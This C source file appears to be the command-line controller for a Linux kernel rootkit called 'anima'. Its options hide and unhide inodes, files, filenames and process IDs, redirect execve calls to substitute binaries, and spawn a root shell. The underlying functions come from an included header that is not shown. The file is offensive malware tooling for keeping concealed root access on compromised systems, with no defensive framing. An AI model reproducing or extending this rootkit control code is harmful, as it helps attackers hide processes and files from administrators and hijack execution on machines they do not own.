#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <getopt.h>

#include <anima/anima_ctl.h>
#include "anima_api.h"

static struct option long_options[] = {
	{"hide-inode", 1, 0, 0},
	{"unhide-inode", 1, 0, 1},
	{"root-shell", 0, 0, 2},
	{"hide-file", 1, 0, 3},
	{"unhide-file", 1, 0, 4},
	{"hide-pid", 1, 0, 5},
	{"unhide-pid", 1, 0, 6},
	{"hide-filename", 1, 0, 7},
	{"unhide-filename", 1, 0, 8},
	{"redirect-execve", 1, 0, 9},
	{"unredirect-execve", 1, 0, 10},
	{"debug-rk", 0, 0, 11},
	{"debug-stats", 0, 0, 12},
	{0, 0, 0, 0}
};

void usage(const char *path)
{
	printf("%s [options]\n" \
		"\t--hide-inode <inode>\thide inode\n"			\
		"\t--unhide-inode <inode>\tunhide inode\n"		\
		"\t--root-shell\t\tgive a root shell\n"			\
		"\t--hide-file <path>\thide file\n"			\
		"\t--unhide-file <path>\tunhide file\n"			\
		"\t--hide-filename <name>\thide filename\n"		\
		"\t--unhide-filename <name>\tunhide filename\n"		\
		"\t--redirect-execve <path:new_path>\t redirect exexve\n"\
		"\t--unredirect-execve <path:new_path>\t unredirect execve\n"\
		"\t--debug-rk\t\t(for debugging purpose)\n"		\
		"\t--debug-stats\t\t(for debugging purpose)\n"		\
		, path);
}

int main(int argc, char **argv)
{
	int c, opt_idx;
	struct rk_args args;

	for (;;) {
		memset(&args, 0, sizeof(args));
		c = getopt_long(argc, argv, "h", long_options, &opt_idx);
		if (c == -1)
			break;

		switch (c) {
		case 'h':
			usage(argv[0]);
			return 0;
		case 0:
			hide_inode(atoi(optarg));
			break;
		case 1:
			unhide_inode(atoi(optarg));
			break;
		case 2:
			root_shell();
			break;
		case 3:
			hide_file(optarg);
			break;
		case 4:
			unhide_file(optarg);
			break;
		case 5:
			hide_pid(atoi(optarg));
			break;
		case 6:
			unhide_pid(atoi(optarg));
			break;
		case 7:
			hide_filename(optarg);
			break;
		case 8:
			unhide_filename(optarg);
			break;
		case 9:
			redirect_execve(optarg);
			break;
		case 10:
			unredirect_execve(optarg);
			break;
		case 11:
			anima_control(DEBUG_RK, NULL);
			break;
		case 12:
			anima_control(DEBUG_STATS, NULL);
			break;
		default:
			break;
		}
	}


	return 0;
}
